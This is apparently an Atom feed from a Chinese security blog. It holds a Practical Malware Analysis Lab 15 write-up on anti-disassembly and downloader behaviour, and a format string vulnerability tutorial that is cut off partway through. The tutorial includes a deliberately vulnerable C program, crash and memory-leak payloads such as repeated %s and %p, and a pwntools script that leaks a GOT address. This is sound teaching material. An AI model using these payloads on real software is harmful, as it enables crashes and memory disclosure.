<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>b1ackie&#39;blog</title>
  
  
  <link href="https://b1ackie.cn/atom.xml" rel="self"/>
  
  <link href="https://b1ackie.cn/"/>
  <updated>2022-01-13T07:14:33.280Z</updated>
  <id>https://b1ackie.cn/</id>
  
  <author>
    <name>b1ackie</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>恶意代码分析实战-实验15</title>
    <link href="https://b1ackie.cn/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/"/>
    <id>https://b1ackie.cn/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/</id>
    <published>2022-01-11T08:59:49.000Z</published>
    <updated>2022-01-13T07:14:33.280Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lab-15-1"><a href="#Lab-15-1" class="headerlink" title="Lab 15-1"></a>Lab 15-1</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>使用IDA打开程序，看到当前的代码，有几个红色的地方，此时已经被混淆过，让IDA的识别出现了问题。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/1-1.png"></p><p>按<code>D</code>将指令转为数据，然后跳过<code>E8</code>按<code>C</code>，重新构造代码，即可看到正确的汇编代码。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/1-2.png"></p><p>重新构造了汇编代码之后，分析一下程序的流程，首先是检查是否携带参数，这里注意下，<code>argc</code>默认是1，携带一个参数就是2，然后这里的<code>ebp+8</code>是<code>argc</code>参数稍微说明一下。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/1-3.png"></p><p>首先<code>main</code>有三个参数，<code>argc</code>，<code>argv</code>，<code>envp</code>，此时形成栈帧，那么当前栈的<code>ebp+4</code>就是返回地址，再下面就是压入栈的参数了，参数从右向左入栈，那么<code>ebp+8</code>就是<code>argc</code>。这里拿OD动调的来看一下，就明白了。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/1-4.png"></p><p>继续分析，如果参数不对的话，就会跳转到<code>0x40105E</code>处，这里是输出错误的情况</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/1-5.png"></p><p>然后是参数的比较，看到这里是<code>ebp+c</code>，刚才已经分析过了，这就是<code>main</code>函数的第二个参数<code>argv</code>，再看它赋值给<code>eax</code>之后，又是<code>eax+4</code>，这是<code>argv</code>是个数组，如果带参数的话，那么<code>argv[1]</code>才是参数。</p><p>看到这三处都是在比较参数的指定位置是否是指定的字符，也就是<code>pdq</code>，那么想要输出正确的条件，就需要输入参数<code>pdq</code>。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/1-6.png"></p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/1-7.png"></p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><h4 id="1-这个二进制程序中使用了何种对抗反汇编技术？"><a href="#1-这个二进制程序中使用了何种对抗反汇编技术？" class="headerlink" title="1. 这个二进制程序中使用了何种对抗反汇编技术？"></a>1. 这个二进制程序中使用了何种对抗反汇编技术？</h4><p>通过在正确的语句前，加一个机器码<code>0xE8</code>，这是<code>call</code>指令的机器码，它会将后面的代码识别称为要<code>call</code>的地址，依次来欺骗反汇编。</p><h4 id="2-这个二进制程序使用了什么流氓机器码来欺骗反汇编过程？"><a href="#2-这个二进制程序使用了什么流氓机器码来欺骗反汇编过程？" class="headerlink" title="2. 这个二进制程序使用了什么流氓机器码来欺骗反汇编过程？"></a>2. 这个二进制程序使用了什么流氓机器码来欺骗反汇编过程？</h4><p><code>0xE8</code></p><h4 id="3-这种对抗反汇编技术被使用了多少次？"><a href="#3-这种对抗反汇编技术被使用了多少次？" class="headerlink" title="3. 这种对抗反汇编技术被使用了多少次？"></a>3. 这种对抗反汇编技术被使用了多少次？</h4><p>一共使用了5次</p><h4 id="4-什么命令行参数会让程序输出“Good-Job”？"><a href="#4-什么命令行参数会让程序输出“Good-Job”？" class="headerlink" title="4. 什么命令行参数会让程序输出“Good Job”？"></a>4. 什么命令行参数会让程序输出“Good Job”？</h4><p><code>pdq</code></p><h2 id="Lab-15-2"><a href="#Lab-15-2" class="headerlink" title="Lab 15-2"></a>Lab 15-2</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>使用IDA打开程序，看到部分的代码被识别成为了数据，重新识别一下。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/2-1.png"></p><p>发现混淆有<code>E8</code>、<code>E9</code>、<code>EB</code>这三个十六进制值，分别是<code>call</code>指令和<code>jmp</code>指令，分别对应的重新识别即可。</p><p>还有这个地方，实际上就是书中说的，一个字节用在了两个汇编指令之中。首先正常执行，会执行<code>mov     ax, 5EBh</code>、<code>xor     eax, eax</code>、<code>jz      short near ptr loc_4012E6+2</code>这三个语句此时注意这个跳转指令是跳到<code>loc_4012E6+2</code>这个地方，这里也就是<code>4012E8</code>，看IDA中并没有这个地址。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/2-2.png"></p><p>实际上这个地址的开始就是<code>EB</code>这个字节的开始，然后后面是<code>05</code>就是一个<code>jmp</code>指令了，第一次<code>EB</code>是作为<code>mov     ax, 5EBh</code>，中给<code>ax</code>赋值的值，第二次是作为跳转指令。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/2-3.png"></p><p>重新构造了指令之后，框选所有的代码，按下<code>P</code>即可重新创建函数，再按<code>F5</code>就可以查看伪代码。</p><p>看到整体的流程，在初始化网络之后，会获取<code>hostname</code>然后进行处理，主要是如果是字母<code>Z</code>会替换成<code>A</code>，如果是<code>z</code>会替换成<code>a</code>，如果是数字<code>9</code>会替换成<code>0</code>，其他的则会在原来<code>ascii</code>码的基础上加一。这个变化后的值会作为<code>USER-AGENT</code>，打开一个<code>URL</code>。读取网页内容，再其中搜索<code>Bamboo::</code>后的内容。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/2-4.png"></p><p>但是从<code>401216</code>到<code>401300</code>的代码并没有被翻译成伪代码，不知道为什么。这部分的内容尝试打开一个URL。<code>sub_40130F</code>是将exe的名字进行复制。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/2-5.png"></p><p>读取内容，然后创建一个叫Account Summary.xls.exe得文件，再将内容写入。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/2-6.png"></p><p>执行这个文件</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/2-7.png"></p><h3 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h3><h4 id="1-程序初始化请求的URL是什么？"><a href="#1-程序初始化请求的URL是什么？" class="headerlink" title="1. 程序初始化请求的URL是什么？"></a>1. 程序初始化请求的URL是什么？</h4><p><code>http://www.practicalmalwareanalysis.com/bamboo.html</code></p><h4 id="2-User-Agent域是如何产生的？"><a href="#2-User-Agent域是如何产生的？" class="headerlink" title="2. User-Agent域是如何产生的？"></a>2. User-Agent域是如何产生的？</h4><p>是通过<code>hostname</code>来通过一些改变来形成的。</p><h4 id="3-初始化请求时，程序在内存页中查找什么？"><a href="#3-初始化请求时，程序在内存页中查找什么？" class="headerlink" title="3. 初始化请求时，程序在内存页中查找什么？"></a>3. 初始化请求时，程序在内存页中查找什么？</h4><p>在查找<code>Bamboo::</code></p><h4 id="4-程序如何处理它从页中提取的信息？"><a href="#4-程序如何处理它从页中提取的信息？" class="headerlink" title="4. 程序如何处理它从页中提取的信息？"></a>4. 程序如何处理它从页中提取的信息？</h4><p>获取之后会再尝试打开一个URL，然后获取网页的信息写入Account Summary.xls.exe文件之中。</p><h2 id="Lab-15-3"><a href="#Lab-15-3" class="headerlink" title="Lab 15-3"></a>Lab 15-3</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>使用IDA打开程序进行分析，看到是一个进程遍历的程序，它会遍历所有的进程，同时遍历进程的所有线程和模块。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-1.png"></p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-2.png"></p><p>模块遍历</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-3.png"></p><p>线程遍历</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-4.png"></p><p><code>sub_4013D1</code>是一个出现错误的时候，提示错误的函数，调用<code>GetLastError</code>获取错误号，再打印出来。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-5.png"></p><p>函数刚开始就会修改返回地址，这里先将<code>0x400000</code>给<code>eax</code>，然后<code>or eax ，0x148C</code>此时eax等于<code>0x40148C</code>，这就是想要的返回地址，再写入到<code>[ebp+0x4]</code>这个地址之中，这就是原先返回值得地址。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-6.png"></p><p>在IDA中查看一下返回地址的函数，存在混淆。看到红色的地方，是<code>jmp</code>指令，那么大概又是通过跳转的混淆。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-7.png"></p><p>重新构造指令之后，查看，发现这段代码主要目的是构造一个结构化异常处理，看到框中的代码把自己的处理函数加入了<code>SEH</code>链中。然后通过<code>xor ecx,ecx</code>、<code>div ecx</code>这两条指令来触发异常。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-8.png"></p><p>继续查看这个函数，看到一些指令都没有被识别。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-9.png"></p><p>重新构造指令。首先会调用两次解密函数<code>sub_401534</code>，解密一些信息。然后下载资源到指定文件。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-10.png"></p><p>然后以隐藏方式启动这个文件</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-11.png"></p><p>加密的信息，前三行是第一个解密函数解密的信息，最后一行是第二个。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-12.png"></p><p>解密函数非常简单，就是一个取反的操作。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-13.png"></p><p>解密后的<code>URL</code></p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-14.png"></p><p>但是有一个问题，就是第二部分密文，没办法进行解密，因为解密函数判断要解密的第一个字节是不是0，但是要解密的信息，起始是<code>0x403040</code>，这里是0，所以导致没办法进行解密。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-15.png"></p><p>我们自己解密一下，看到是一个exe名称。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-16.png"></p><h3 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h3><h4 id="1-恶意代码怎样被初始化调用？"><a href="#1-恶意代码怎样被初始化调用？" class="headerlink" title="1. 恶意代码怎样被初始化调用？"></a>1. 恶意代码怎样被初始化调用？</h4><p>通过修改主函数的返回地址，在主函数返回的时候，进行调用。</p><h4 id="2-恶意代码都做了什么？"><a href="#2-恶意代码都做了什么？" class="headerlink" title="2. 恶意代码都做了什么？"></a>2. 恶意代码都做了什么？</h4><p>解密一个<code>URL</code>，在上面下载资源保存为spoolsrv.exe并且执行</p><h4 id="3-恶意代码使用了什么URL？"><a href="#3-恶意代码使用了什么URL？" class="headerlink" title="3. 恶意代码使用了什么URL？"></a>3. 恶意代码使用了什么URL？</h4><p><code>http://www.practicalmalwareanalysis.com/tt.html</code></p><h4 id="4-恶意代码使用了什么文件名？"><a href="#4-恶意代码使用了什么文件名？" class="headerlink" title="4. 恶意代码使用了什么文件名？"></a>4. 恶意代码使用了什么文件名？</h4><p><code>spoolsrv.exe</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Lab-15-1&quot;&gt;&lt;a href=&quot;#Lab-15-1&quot; class=&quot;headerlink&quot; title=&quot;Lab 15-1&quot;&gt;&lt;/a&gt;Lab 15-1&lt;/h2&gt;&lt;h3 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="恶意代码分析实战" scheme="https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="Lab" scheme="https://b1ackie.cn/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-01-06T09:35:24.000Z</published>
    <updated>2022-01-11T06:45:39.713Z</updated>
    
    <content type="html"><![CDATA[<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><p>格式化字符串函数可以接收可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来讲，格式化字符串函数就是将计算机内存中表示的数据转化为可读的字符串格式。几乎所有的C/C++程序都会利用格式化字符串函数来输出信息、调试程序、或者处理字符串。一般来说，格式化字符串在利用的时候主要为三个部分：</p><ul><li>格式化字符串函数</li><li>格式化字符串</li><li>后续参数，可选</li></ul><h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h3><h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><p>scanf</p><h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><table><thead><tr><th>函数</th><th>基本介绍</th></tr></thead><tbody><tr><td>printf</td><td>输出到stdout</td></tr><tr><td>fprintf</td><td>输出到指定FILE流</td></tr><tr><td>vprintf</td><td>根据参数列表格式化输出到stdout</td></tr><tr><td>vfprintf</td><td>根据参数列表格式化输出到指定的FILE流</td></tr><tr><td>sprintf</td><td>输出到字符串</td></tr><tr><td>snprintf</td><td>输出指定字节数到字符串</td></tr><tr><td>vsprintf</td><td>根据参数列表格式化输出到字符串</td></tr><tr><td>vsnprintf</td><td>根据参数列表格式化输出指定字节到字符串</td></tr><tr><td>setproctitle</td><td>设置argv</td></tr><tr><td>syslog</td><td>输出日志</td></tr></tbody></table><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>首先来看一下关于<code>printf</code>函数，比如说如下语句</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;color  %s, number %d, float %4.2f&quot;</span>, <span class="hljs-string">&quot;red&quot;</span>, <span class="hljs-number">123456</span>, <span class="hljs-number">3.14</span>);<br></code></pre></div></td></tr></table></figure><p>当执行到printf前的栈情况是这样的，为了看起来更方便，用gdb调试查看。可以看到当前的栈情况，首先是<code>color  %s, number %d, float %4.2f</code>，然后是三个参数。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.png"></p><p>在进入<code>printf</code>之前，函数会首先获取第一个参数，一个一个读取字符会遇到两种情况。</p><ul><li>当前字符不是%，直接输出到相应标准输出。</li><li>当前字符是%，继续读取下一个字符，会有三种情况。</li></ul><ol><li>如果没有字符，报错；</li><li>如果下一个字符是%，输出%；</li><li>否则根据相应的字符，获取相应的参数，对其进行解析并输出。</li></ol><p>假设前面的程序，语句修改成如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;color  %s, number %d, float %4.2f&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>此时，对于这个函数并没有提供参数，程序就会将栈上的三个变量分别解析为</p><ol><li>解析其地址对应的字符串</li><li>解析其内容对应的整型值</li><li>解析其内容对应的浮点数</li></ol><p>后面两个还好一点，但是对于第一个<code>%s</code>来说，如果提供了一个不可以访问的地址，那么程序就会崩溃，这就是格式化字符串漏洞的基本原理。</p><h2 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h2><p>对于格式化字符串的漏洞利用主要是两个利用手段</p><ul><li>是程序崩溃，因为<code>%s</code>对应的参数地址不合法的概率较大。</li><li>查看进程内容，根据<code>%d</code>，<code>%f</code>输出了栈上的内容。</li></ul><h3 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h3><p>对于程序崩溃来说，一般情况下这是最简单的利用方式，只需要连续输入若干个<code>%s</code>即可。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s<br></code></pre></div></td></tr></table></figure><p>具体的原理，在前面已经介绍过了。</p><h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><p>利用格式化字符串的漏洞，我们可以获取我们想要的输出的内容，一般有如下操作：</p><ul><li>泄露栈内存<ul><li>获取某个变量的值</li><li>获取某个变量对应地址的内存</li></ul></li><li>泄露任意地址内存<ul><li>利用GOT表得到libc函数地址，进而获取libc，也可以获取其他libc函数地址</li><li>盲打，dump整个程序，获取有用信息</li></ul></li></ul><h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>如下的程序</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">0x22222222</span>, c = <span class="hljs-number">-1</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h5><p>首先是可以利用格式化字符串来获取栈上的变量的数值。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/2.png"></p><p>可以看到打印出来三个十六进制值，可以通过调试进一步查看。</p><p>可以看到输入<code>%08x.%08x.%08x</code>，打印出来三个栈上的值</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/3.png"></p><p>如上的方法，是依次获得栈中的每个参数，也可以通过如下方法，获得指定的参数的值。</p><figure class="highlight cos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cos"><span class="hljs-built_in">%n</span><span class="hljs-built_in">$x</span><br></code></pre></div></td></tr></table></figure><p>比如还是刚才的程序，输入<code>%3$x</code>，查看结果，看到输出了第三个参数的值，也就是栈上的第四个值。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/4.png"></p><h5 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h5><p>还可以获得栈变量对应的字符串，只需要输入<code>%s</code>就可以了。</p><p>还是这个程序，输入<code>%s</code>查看结果。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/5.png"></p><h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>刚才尝试了泄露栈上的连续变量，指定的变量，但还时没有能完全控制我们所要泄露的变量的地址。有时，可能需要泄露某一个<code>libc</code>函数的<code>got</code>表内容，从而得到其地址，进而获取<code>libc</code>版本以及其他函数的地址。</p><p>如果我们想要控制格式化字符串，我们就要知道该格式化字符串在输出函数调用的时候，用的是第几个参数，假设此时对应的是第n个参数，那么就可以通过如下方式获得某个指定地址addr的内容</p><p><code>addr%n$s</code></p><p>如何确定是第几个参数，就可以通过输入一长列%p来确定<code>[tag]%p%p%p%p%p%p...</code>。</p><p>还是拿之前的程序来做例子，输入<code>aaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</code></p><p>从图中可以看出，第四个位置是61616161，也就是我们输入的aaaa的ASCII码，那么现在可以确定是第四个参数。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/6.png"></p><p>现在尝试获取以下<code>scanf</code>函数的地址，使用<code>pwntools</code>来构造<code>payload</code>。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./2&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./2&quot;</span>)<br>scanf = elf.got[<span class="hljs-string">&quot;__isoc99_scanf&quot;</span>]<br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(scanf)<br>payload = p32(scanf) + <span class="hljs-string">&quot;%4$s&quot;</span><br><span class="hljs-built_in">print</span> payload<br>gdb.attach(sh)<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&quot;%4$s\n&quot;</span>)<br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(sh.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]))<br>sh.interactive()<br></code></pre></div></td></tr></table></figure><p>看到已经成功打印出了<code>scanf</code>函数的地址</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/8.png"></p><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>刚才是通过格式化字符串来泄露栈内存以及任意地址的内存，现在来尝试修改任意地址变量的内存，只要变量对应的地址可写，就可以利用格式化字符串来修改其对应的数值。</p><p><code>%n</code>是不输出字符，但是会把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p><p>示例程序</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">int</span> a = <span class="hljs-number">123</span>, b = <span class="hljs-number">456</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> c = <span class="hljs-number">789</span>;<br>  <span 